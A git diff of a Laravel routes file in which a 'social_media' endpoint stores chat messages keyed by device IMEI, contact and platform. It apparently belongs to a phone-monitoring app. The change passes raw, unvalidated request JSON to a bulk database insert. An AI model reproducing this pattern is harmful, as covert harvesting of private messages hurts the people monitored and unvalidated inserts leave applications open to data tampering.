@@ -152,16 +152,16 @@ use Illuminate\Support\Facades\Route;
         return response("Successful app entry",200);
     });
     Route::post('social_media',function(Request $request) {
-        $socialData = (object) $request->json()->all();
-
-        SocialApp::create([
-            "imei"=>$socialData->imei,
-            "contact"=>$socialData->contact,
-            "type"=>$socialData->type,
-            "message"=>$socialData->message,
-            "platform"=>$socialData->platform,
-            "date"=>$socialData->date
-            ]);
+        $socialData = $request->json()->all();
+        SocialApp::insert($socialData);
+        // SocialApp::create([
+        //     "imei"=>$socialData->imei,
+        //     "contact"=>$socialData->contact,
+        //     "type"=>$socialData->type,
+        //     "message"=>$socialData->message,
+        //     "platform"=>$socialData->platform,
+        //     "date"=>$socialData->date
+        //     ]);
         return response("Successful chat message entry",200);
     });
 
